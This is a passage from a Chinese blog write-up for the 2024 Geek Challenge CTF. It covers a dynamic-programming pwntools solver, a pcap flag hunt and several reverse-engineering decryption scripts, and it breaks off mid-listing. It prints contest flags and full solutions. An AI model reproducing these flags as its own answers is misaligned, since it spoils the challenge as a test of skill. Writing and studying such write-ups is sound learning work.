<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024极客大挑战wp | iyheart的博客</title><meta name="author" content="iyheart"><meta name="copyright" content="iyheart"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：打完极客大挑战电脑的电源线坏了（太搞心态了），还想再学点新东西的">
<meta property="og:type" content="article">
<meta property="og:title" content="2024极客大挑战wp">
<meta property="og:url" content="http://iyheart.github.io/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/index.html">
<meta property="og:site_name" content="iyheart的博客">
<meta property="og:description" content="前言：打完极客大挑战电脑的电源线坏了（太搞心态了），还想再学点新东西的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover121.png">
<meta property="article:published_time" content="2024-11-22T12:07:57.000Z">
<meta property="article:modified_time" content="2025-01-02T11:13:31.686Z">
<meta property="article:author" content="iyheart">
<meta property="article:tag" content="博客, 笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover121.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://iyheart.github.io/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2024极客大挑战wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-01-02 19:13:31'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/styles.css"><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iyheart的博客" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">157</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-tasks"></i><span> 知识库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/docs/"><i class="fa-fw fas fa-book"></i><span> 编程语言知识库</span></a></li><li><a class="site-page child" href="/practice/"><i class="fa-fw fas fa-book"></i><span> PWN刷题记录</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/update/"><i class="fa-fw fas fa-bell"></i><span> 更新</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-bus"></i><span> 随机文章</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover121.png')"><nav id="nav"><span id="blog-info"><a href="/" title="iyheart的博客"><img class="site-icon" src="http://img95.699pic.com/photo/40151/9175.gif_wh860.gif"/><span class="site-name">iyheart的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-tasks"></i><span> 知识库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/docs/"><i class="fa-fw fas fa-book"></i><span> 编程语言知识库</span></a></li><li><a class="site-page child" href="/practice/"><i class="fa-fw fas fa-book"></i><span> PWN刷题记录</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/update/"><i class="fa-fw fas fa-bell"></i><span> 更新</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-bus"></i><span> 随机文章</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024极客大挑战wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-22T12:07:57.000Z" title="发表于 2024-11-22 20:07:57">2024-11-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-02T11:13:31.686Z" title="更新于 2025-01-02 19:13:31">2025-01-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/write-up/">write-up</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">14.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>68分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024极客大挑战wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1>
<h2 id="2024-极客挑战赛"><a class="markdownIt-Anchor" href="#2024-极客挑战赛"></a> 2024 极客挑战赛！</h2>
<ul>
<li>关注微信号即可得flag</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241030091931593.png" alt="image-20241030091931593"></p>
<ul>
<li>flag：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;weLc0mE-tO-2_o_2_100-GeeK@cha11Enge!!&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ez_climbstairs"><a class="markdownIt-Anchor" href="#ez_climbstairs"></a> ez_climbstairs</h2>
<ul>
<li>
<p>动态规划基础题，爬楼梯。现场学了一下，还要使用pwntools进行交互。</p>
</li>
<li>
<p>一开始以为题目默认只能垮1、2个楼梯，结果发现是一次能垮1、2、3个楼梯</p>
</li>
<li>
<p>直接贴exp：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.set_int_max_str_digits(<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">22718</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dp</span>(<span class="params">jie</span>):</span><br><span class="line">    b1 = <span class="number">1</span></span><br><span class="line">    b2 = <span class="number">2</span></span><br><span class="line">    b3 = <span class="number">4</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(jie - <span class="number">3</span>):</span><br><span class="line">        result = b1 + b2 + b3</span><br><span class="line">        b1 = b2</span><br><span class="line">        b2 = b3</span><br><span class="line">        b3 = result</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = p.recv().decode(<span class="string">&#x27;utf-8&#x27;</span>)[<span class="number">11</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">9</span>:</span><br><span class="line">    a = a[:<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(a) == <span class="number">10</span>:</span><br><span class="line">    a = a[:<span class="number">5</span>]</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">jie = <span class="built_in">int</span>(a)</span><br><span class="line"><span class="built_in">print</span>(jie)</span><br><span class="line">result = dp(jie)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(result).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    a = p.recv().decode(<span class="string">&#x27;utf-8&#x27;</span>)[<span class="number">11</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">9</span>:</span><br><span class="line">        a = a[:<span class="number">4</span>]</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(a) == <span class="number">10</span>:</span><br><span class="line">        a = a[:<span class="number">5</span>]</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">    jie = <span class="built_in">int</span>(a)</span><br><span class="line">    <span class="built_in">print</span>(jie)</span><br><span class="line">    result = dp(jie)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(result).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
<ul>
<li>flag：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;7745e931-0e83-4889-b78f-daa57df1d02a&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ez_pcap_1"><a class="markdownIt-Anchor" href="#ez_pcap_1"></a> ez_pcap_1</h2>
<ul>
<li>主要考简单的流量分析，然后了解文件传输使用的有哪些协议，就很好找到flag</li>
<li>最后在<code>SMB2</code>协议中找到flag</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/202410300927.png" alt="202410300927"></p>
<ul>
<li>flag：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;smb_pcapng_1s_g00d!&#125;</span><br></pre></td></tr></table></figure>
<h1 id="re"><a class="markdownIt-Anchor" href="#re"></a> RE</h1>
<h2 id="hello_re"><a class="markdownIt-Anchor" href="#hello_re"></a> hello_re</h2>
<ul>
<li>打开附件直接查看，发现加密逻辑全部都在这里，数组v7是加密后的密文，v5则是key而key的值为<code>SYCLOVER</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115193054988.png" alt="image-20241115193054988"></p>
<ul>
<li>加密逻辑如下，按照int类型放入v4数组中，然后再进行取余操作和异或操作进行加密，</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115193219858.png" alt="image-20241115193219858"></p>
<ul>
<li>然后就直接开始写脚本解密</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data</span>):</span><br><span class="line">    <span class="comment"># 密钥 &quot;REVO LCYS&quot; (64-bit value)</span></span><br><span class="line">    key = <span class="number">0x5245564F4C435953</span></span><br><span class="line">    key_bytes = key.to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 64位整数转换成字节</span></span><br><span class="line"></span><br><span class="line">    decrypted_data = <span class="built_in">bytearray</span>(<span class="number">32</span>)  <span class="comment"># 用于存放解密后的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐字节逆向解密</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="comment"># 从 encrypted_data 中获取加密后的数据</span></span><br><span class="line">        encrypted_byte = encrypted_data[j]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 进行两次异或操作的逆向</span></span><br><span class="line">        decrypted_byte = encrypted_byte ^ j ^ key_bytes[j % <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 存储解密结果</span></span><br><span class="line">        decrypted_data[j] = decrypted_byte</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例加密后的数据（这个数据你应该从程序运行中获取）</span></span><br><span class="line">encrypted_data = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">52</span>, <span class="number">3</span>, <span class="number">96</span>, <span class="number">47</span>, <span class="number">28</span>,</span><br><span class="line">    <span class="number">107</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">24</span>, <span class="number">45</span>, <span class="number">62</span>, <span class="number">60</span>, <span class="number">2</span>,</span><br><span class="line">    <span class="number">17</span>, <span class="number">123</span>, <span class="number">39</span>, <span class="number">58</span>, <span class="number">41</span>, <span class="number">48</span>, <span class="number">96</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">8</span>, <span class="number">52</span>, <span class="number">63</span>, <span class="number">100</span>, <span class="number">33</span>, <span class="number">106</span>, <span class="number">122</span>, <span class="number">48</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用解密函数</span></span><br><span class="line">decrypted_flag = decrypt(encrypted_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的结果:&quot;</span>, decrypted_flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="先来一道签到题"><a class="markdownIt-Anchor" href="#先来一道签到题"></a> 先来一道签到题</h2>
<ul>
<li>这题附件给的是一个.s文件的汇编代码</li>
<li>这个位置存储的是加密后的字符串</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115193720518.png" alt="image-20241115193720518"></p>
<ul>
<li>通过scanf函数让用户输出flag字符串，输入的字符串数据存储在栈上</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115193835651.png" alt="image-20241115193835651"></p>
<ul>
<li>通过查看这边发现L4这边是flag判断为错的时候将要输出的内容</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115194051995.png" alt="image-20241115194051995"></p>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115194104467.png" alt="image-20241115194104467"></p>
<ul>
<li>所以主要加密逻辑在L3上，L2后半部分是判断明文输入进去后是否和密文相同</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115194141150.png" alt="image-20241115194141150"></p>
<ul>
<li>解密代码如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(data) // <span class="number">2</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        index = i * <span class="number">2</span></span><br><span class="line">        data[index] ^= <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span> index + <span class="number">1</span> &lt; <span class="built_in">len</span>(data):</span><br><span class="line">            data[index + <span class="number">1</span>] += <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_bytearray</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(s, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 加密后的密文</span></span><br><span class="line">    encrypted_data = <span class="string">&quot;TTDv^jrZu`Gg6tXfi+pZojpZSjXmbqbmt.&amp;x&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将密文转换为字节数据</span></span><br><span class="line">    byte_data = string_to_bytearray(encrypted_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密数据</span></span><br><span class="line">    decrypted_data = decrypt(byte_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印解密后的数据</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted data:&quot;</span>, decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="让我康康你的调试"><a class="markdownIt-Anchor" href="#让我康康你的调试"></a> 让我康康你的调试</h2>
<ul>
<li>
<p>使用IDA打开发现是<code>ELF</code>文件，结合题目需要在Linux下进行远程调试</p>
</li>
<li>
<p>现在逐个分析，先分析main函数，发现加密后的密文就是<code>S2</code>数组里面的内容，而这里注意<code>syclover</code>是一个密钥</p>
</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103012458346.png" alt="image-20241103012458346"></p>
<ul>
<li>然后查看<code>sub_14A6</code>这个函数，发现进行了加密</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103012600525.png" alt="image-20241103012600525"></p>
<ul>
<li>再查看<code>sub_11C9</code>这个函数，发现是对密钥进行了操作，这题根据题目所说，动态调试是看执行完<code>sub_11C9</code>这个函数<code>v9</code>的内存值，这题算法其实也可以直接用AI跑，也可以自己慢慢逆</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103013600791.png" alt="image-20241103013600791"></p>
<ul>
<li>这边为了提高逆算法的能力，我采取逆算法的方式解密，所以得到解密<code>sub_11C9</code>这个函数得到</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v9 = []</span><br><span class="line">key = <span class="string">&#x27;syclover&#x27;</span></span><br><span class="line">v8 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v9.append(i)</span><br><span class="line">    v8.append(<span class="built_in">ord</span>(key[i%<span class="number">8</span>]))</span><br><span class="line"><span class="built_in">print</span>(v9)</span><br><span class="line"><span class="built_in">print</span>(v8)</span><br><span class="line"></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v7 = (v8[j] + v7 + v9[j])%<span class="number">256</span></span><br><span class="line">    v4 = v9[j]&amp;<span class="number">0xFF</span></span><br><span class="line">    v9[j] = v9[v7]</span><br><span class="line">    v9[v7] = v4</span><br><span class="line"><span class="built_in">print</span>(v9)</span><br><span class="line">[<span class="number">49</span>, <span class="number">80</span>, <span class="number">82</span>, <span class="number">193</span>, <span class="number">205</span>, <span class="number">167</span>, <span class="number">7</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">253</span>, <span class="number">196</span>, <span class="number">42</span>, <span class="number">114</span>, <span class="number">223</span>, <span class="number">96</span>, 